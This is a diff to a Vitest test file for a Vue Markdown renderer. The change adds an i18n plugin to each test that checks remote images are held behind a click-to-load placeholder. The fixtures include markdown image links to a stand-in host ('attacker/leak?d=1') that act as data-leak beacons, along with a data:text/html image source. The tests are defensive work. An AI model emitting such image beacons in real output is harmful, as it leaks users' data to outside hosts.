@@ -2,6 +2,7 @@
 import { describe, it, expect } from 'vitest';
 import { mount } from '@vue/test-utils';
 import MarkdownRenderer from '../MarkdownRenderer.vue';
+import { i18n } from '@/i18n';
 
 const REMOTE = '![x](https://attacker/leak?d=1)';
 const DATA_IMG = '![y](data:image/png;base64,iVBORw0KGgo=)';
@@ -9,6 +10,7 @@ const DATA_IMG = '![y](data:image/png;base64,iVBORw0KGgo=)';
 describe('MarkdownRenderer remote-image gating', () => {
   it('blocks remote images and shows a host placeholder with zero image nodes', () => {
     const wrapper = mount(MarkdownRenderer, {
+      global: { plugins: [i18n] },
       props: { content: REMOTE, allowRemoteImages: false },
     });
 
@@ -21,6 +23,7 @@ describe('MarkdownRenderer remote-image gating', () => {
 
   it('loads the remote image only after the placeholder is clicked', async () => {
     const wrapper = mount(MarkdownRenderer, {
+      global: { plugins: [i18n] },
       props: { content: REMOTE, allowRemoteImages: false },
     });
 
@@ -34,6 +37,7 @@ describe('MarkdownRenderer remote-image gating', () => {
 
   it('renders remote images immediately when the prop is omitted (chat unchanged)', () => {
     const wrapper = mount(MarkdownRenderer, {
+      global: { plugins: [i18n] },
       props: { content: REMOTE },
     });
 
@@ -43,6 +47,7 @@ describe('MarkdownRenderer remote-image gating', () => {
 
   it('renders data: images immediately even when remote images are blocked', () => {
     const wrapper = mount(MarkdownRenderer, {
+      global: { plugins: [i18n] },
       props: { content: DATA_IMG, allowRemoteImages: false },
     });
 
@@ -56,6 +61,7 @@ describe('MarkdownRenderer remote-image gating', () => {
     ['plain http', '![x](http://attacker/leak?d=1)'],
   ])('gates %s behind the placeholder (no eager img)', (_label, content) => {
     const wrapper = mount(MarkdownRenderer, {
+      global: { plugins: [i18n] },
       props: { content, allowRemoteImages: false },
     });
 
@@ -65,6 +71,7 @@ describe('MarkdownRenderer remote-image gating', () => {
 
   it('renders a sanitized-away (data:text/html) image src as a static blocked label, not a clickable placeholder', () => {
     const wrapper = mount(MarkdownRenderer, {
+      global: { plugins: [i18n] },
       props: { content: '![x](DATA:text/html,<b>x</b>)', allowRemoteImages: false },
     });
 
